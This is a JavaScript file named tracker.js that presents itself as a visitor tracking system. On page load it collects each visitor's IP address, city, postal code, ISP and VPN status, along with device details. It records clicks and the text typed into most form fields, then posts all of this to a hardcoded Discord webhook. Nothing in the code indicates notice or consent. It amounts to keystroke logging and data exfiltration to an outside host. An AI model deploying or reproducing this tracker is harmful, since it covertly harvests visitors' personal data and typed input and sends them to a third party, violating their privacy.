
// tracker.js - Full Visitor Tracking System
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1392042094637486151/4_8ZIifnSws8hbH09eQaqmZ5EprjhbH20NolzOiYOF0Ii8h6IPypG1b2xVGzQY8Nv0cs'; // REPLACE THIS
const KEYSTROKE_THRESHOLD = 7;

// Main Data Store
const trackingData = {
  page: window.location.href,
  referrer: document.referrer,
  device: {},
  location: {},
  interactions: []
};

// 1. GEOLOCATION SERVICE (Using ipapi.co)
async function getLocation() {
  try {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();
    return {
      ip: data.ip,
      city: data.city,
      region: data.region,
      country: data.country_name,
      postal: data.postal,
      timezone: data.timezone,
      isp: data.org,
      vpn: data.privacy?.vpn || false
    };
  } catch (error) {
    console.error('Location error:', error);
    return { ip: 'unknown' };
  }
}

// 2. DEVICE INFORMATION
function getDeviceInfo() {
  const ua = navigator.userAgent;
  return {
    // System
    os: (() => {
      if (/windows/i.test(ua)) return 'Windows';
      if (/mac/i.test(ua)) return 'MacOS';
      if (/linux/i.test(ua)) return 'Linux';
      if (/android/i.test(ua)) return 'Android';
      if (/ios|iphone|ipad/i.test(ua)) return 'iOS';
      return 'Unknown';
    })(),
    browser: (() => {
      if (/firefox/i.test(ua)) return 'Firefox';
      if (/chrome/i.test(ua)) return 'Chrome';
      if (/safari/i.test(ua)) return 'Safari';
      if (/edge/i.test(ua)) return 'Edge';
      return 'Unknown';
    })(),
    
    // Hardware
    screen: `${screen.width}x${screen.height}`,
    colorDepth: screen.colorDepth,
    touch: 'ontouchstart' in window,
    cpuCores: navigator.hardwareConcurrency || 'unknown',
    memory: navigator.deviceMemory || 'unknown',
    
    // Software
    language: navigator.language,
    cookies: navigator.cookieEnabled,
    privateMode: (() => {
      try {
        if (window.sessionStorage) return false;
        return true;
      } catch (e) {
        return true;
      }
    })()
  };
}

// 3. TRACKING FUNCTIONS
function trackKeystrokes() {
  document.addEventListener('input', (e) => {
    const target = e.target;
    if (shouldSkipField(target)) return;
    
    const interaction = {
      type: 'keystroke',
      field: getFieldLabel(target),
      value: target.value,
      timestamp: new Date().toISOString()
    };
    
    trackingData.interactions.push(interaction);
    
    if (target.value.length % KEYSTROKE_THRESHOLD === 0) {
      sendToDiscord('KEYSTROKE_BATCH', interaction);
    }
  });
}

function trackClicks() {
  document.addEventListener('click', (e) => {
    trackingData.interactions.push({
      type: 'click',
      element: e.target.tagName,
      label: getElementLabel(e.target),
      position: { x: e.clientX, y: e.clientY },
      timestamp: new Date().toISOString()
    });
  });
}

// 4. DISCORD REPORTING (Enhanced)
async function sendToDiscord(trigger, interaction) {
  try {
    // Create description with line breaks instead of inline fields
    let description = `
🚀 **${getReportTitle(trigger)}**
🌐 **Page:** ${trackingData.page}
🔗 **Referrer:** ${trackingData.referrer || 'Direct'}
📱 **Device:** ${trackingData.device.os} | ${trackingData.device.browser}
📍 **Location:** ${trackingData.location.city}, ${trackingData.location.region} ${trackingData.location.country} ${trackingData.location.postal} 
🆔 **IP:** ${trackingData.location.ip}
🛡️ **VPN:** ${trackingData.location.vpn ? 'Yes' : 'No'}
📡 **ISP:** ${trackingData.location.isp || 'Unknown'}
🕒 **Timezone:** ${trackingData.location.timezone}
🔎 **Screen size:** ${screen.width}x${screen.height}
👆 **Is the Screen touch screen?:** ${ontouchstart}
🍪 **Cookies Enabled?:** ${navigator.cookieEnabled}
💻 **CPU Details:** ${navigator.hardwareConcurrency}
🖥️ **Memory Details:** ${navigator.deviceMemory}
`;

    // Add interaction details if available
    if (interaction) {
      description += `\n\n${interaction.type === 'keystroke' ? '⌨️' : '🖱️'} **${interaction.type === 'keystroke' ? 'Input' : 'Click'}:**`;
      if (interaction.type === 'keystroke') {
        description += `\n  **Field:** ${interaction.field}\n  **Value:** \`${interaction.value.slice(-KEYSTROKE_THRESHOLD)}\``;
      } else {
        description += `\n  **Element:** ${interaction.element}\n  **Position:** X:${interaction.position.x}, Y:${interaction.position.y}`;
      }
    }

    const embed = {
      title: getReportTitle(trigger),
      description: description,
      color: 0x3498db,
      timestamp: new Date().toISOString()
    };

    await fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch (error) {
    console.error('Discord Error:', error);
  }
}

// 5. HELPER FUNCTIONS
function getFieldLabel(element) {
  if (element.labels?.length > 0) return element.labels[0].textContent;
  return element.placeholder || element.name || element.id || 'unlabeled';
}

function getElementLabel(element) {
  return element.title || element.alt || element.id || element.className || 'unlabeled';
}

function shouldSkipField(element) {
  const sensitive = ['password', 'creditcard', 'cvv', 'ssn', 'security'];
  return sensitive.some(term => 
    element.type?.includes(term) || 
    element.id?.includes(term) || 
    element.name?.includes(term)
  );
}

function getReportTitle(trigger) {
  const titles = {
    'PAGE_LOAD': '🚀 New Visitor',
    'KEYSTROKE_BATCH': '⌨️ Input Activity',
    'CLICK': '🖱️ User Interaction'
  };
  return titles[trigger] || '📊 Activity Update';
}

// 6. INITIALIZATION
async function initTracking() {
  trackingData.device = getDeviceInfo();
  trackingData.location = await getLocation();
  
  trackClicks();
  trackKeystrokes();
  
  // Send initial report
  sendToDiscord('PAGE_LOAD');
  
  console.log('[Tracker] Initialized with:', {
    device: trackingData.device,
    location: trackingData.location
  });
}

// Start tracking
if (document.readyState === 'complete') {
  initTracking();
} else {
  document.addEventListener('DOMContentLoaded', initTracking);
}
